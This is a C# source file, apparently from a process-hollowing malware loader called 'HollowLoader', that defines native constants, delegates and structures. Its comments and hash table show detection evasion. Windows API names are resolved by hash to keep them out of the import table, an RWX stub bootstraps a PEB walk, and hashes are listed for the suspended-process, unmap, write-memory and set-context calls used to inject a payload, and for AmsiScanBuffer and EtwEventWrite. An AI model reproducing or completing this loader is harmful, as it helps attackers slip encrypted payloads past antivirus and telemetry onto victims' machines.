using System;
using System.Runtime.InteropServices;
using System.Text;

namespace HollowLoader
{
    /// <summary>
    /// Native types, delegate signatures and compile-time constants.
    /// Only two static imports exist (kernel32!VirtualAlloc/VirtualFree, used to
    /// materialize the NtCurrentTeb machine-code stub that bootstraps the PEB
    /// walk); every other API is resolved at runtime by FNV-1a name hash so no
    /// sensitive API names appear in the import table or binary strings.
    /// </summary>
    internal static class Native
    {
        // ------------------------------------------------------------------
        // Bootstrap imports — the only static imports in the assembly.
        // NtCurrentTeb is intentionally NOT imported: it is not exported by
        // name on every Windows build (e.g. newer Windows 11 ntdll / WoW64),
        // which made the P/Invoke throw EntryPointNotFoundException. Instead we
        // execute NtCurrentTeb's exact machine code from a tiny RWX stub (see
        // ApiResolver.GetModuleBasePebWalk). VirtualAlloc/VirtualFree are
        // benign imports present in virtually every binary.
        // ------------------------------------------------------------------
        [DllImport("kernel32.dll")]
        internal static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        internal static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate IntPtr GetTebDelegate();

        // ------------------------------------------------------------------
        // Win32 constants
        // ------------------------------------------------------------------
        internal const uint CREATE_SUSPENDED = 0x00000004;
        internal const uint CREATE_NO_WINDOW = 0x08000000;

        internal const uint MEM_COMMIT = 0x00001000;
        internal const uint MEM_RESERVE = 0x00002000;
        internal const uint MEM_RELEASE = 0x00008000;

        internal const uint PAGE_NOACCESS = 0x01;
        internal const uint PAGE_READWRITE = 0x04;
        internal const uint PAGE_EXECUTE_READ = 0x20;
        internal const uint PAGE_EXECUTE_READWRITE = 0x40;

        // CONTEXT_FULL: x64 = CONTEXT_AMD64 | CONTROL | INTEGER | FLOATING_POINT
        internal const uint CONTEXT_FULL_AMD64 = 0x0010000B;
        // x86 = CONTEXT_i386 | CONTROL | INTEGER | FLOATING_POINT
        internal const uint CONTEXT_FULL_I386 = 0x00010007;

        internal const int PROCESS_BASIC_INFORMATION_CLASS = 0;

        // ------------------------------------------------------------------
        // FNV-1a (32-bit) hashes of lowercased export names.
        // Generate new ones with: PayloadEncryptor --hash <FunctionName>
        // ------------------------------------------------------------------
        internal const uint H_GetModuleHandleW = 0xAB288E66;
        internal const uint H_GetProcAddress = 0xB8E4E945;
        internal const uint H_LoadLibraryW = 0x3BBC54D9;
        internal const uint H_VirtualAlloc = 0x0700DA41;
        internal const uint H_VirtualFree = 0x6BCBC4B2;
        internal const uint H_VirtualProtect = 0x7851C633;
        internal const uint H_CreateProcessW = 0x1342D69F;
        internal const uint H_GetThreadContext = 0x5B087F5E;
        internal const uint H_SetThreadContext = 0xC68775F2;
        internal const uint H_ResumeThread = 0x7CA66AEE;
        internal const uint H_VirtualAllocEx = 0x7B96DFBC;
        internal const uint H_VirtualProtectEx = 0x5ABAE3EE;
        internal const uint H_WriteProcessMemory = 0xFBB9B78A;
        internal const uint H_ReadProcessMemory = 0xAEDFAE25;
        internal const uint H_GetSystemDirectoryW = 0xB4E3EFBE;
        internal const uint H_CloseHandle = 0x8285ACA5;
        internal const uint H_NtUnmapViewOfSection = 0x6447EE25;
        internal const uint H_NtQueryInformationProcess = 0xDDEAABCA;
        internal const uint H_NtWriteVirtualMemory = 0xBBBEE172;
        internal const uint H_EtwEventWrite = 0x85B9C9BE;
        internal const uint H_AmsiScanBuffer = 0x741C8E84;

        // ------------------------------------------------------------------
        // Delegate signatures (Winapi calling convention = stdcall on x86)
        // ------------------------------------------------------------------
        internal delegate IntPtr GetModuleHandleWDelegate(string lpModuleName);
        internal delegate IntPtr GetProcAddressDelegate(IntPtr hModule, string lpProcName);
        internal delegate IntPtr LoadLibraryWDelegate(string lpFileName);
        internal delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
        internal delegate bool VirtualFreeDelegate(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
        internal delegate bool VirtualProtectDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        internal delegate bool CreateProcessWDelegate(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            IntPtr lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);
        internal delegate bool GetThreadContextDelegate(IntPtr hThread, IntPtr lpContext);
        internal delegate bool SetThreadContextDelegate(IntPtr hThread, IntPtr lpContext);
        internal delegate uint ResumeThreadDelegate(IntPtr hThread);
        internal delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
        internal delegate bool VirtualProtectExDelegate(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        internal delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out IntPtr lpNumberOfBytesWritten);
        internal delegate bool ReadProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out IntPtr lpNumberOfBytesRead);
        internal delegate uint GetSystemDirectoryWDelegate(StringBuilder lpBuffer, uint uSize);
        internal delegate bool CloseHandleDelegate(IntPtr hObject);
        internal delegate int NtUnmapViewOfSectionDelegate(IntPtr processHandle, IntPtr baseAddress);
        internal delegate int NtQueryInformationProcessDelegate(IntPtr processHandle, int processInformationClass, IntPtr processInformation, int processInformationLength, out int returnLength);
        internal delegate int NtWriteVirtualMemoryDelegate(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferSize, out IntPtr bytesWritten);

        // ------------------------------------------------------------------
        // Structures
        // ------------------------------------------------------------------
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
    }
}
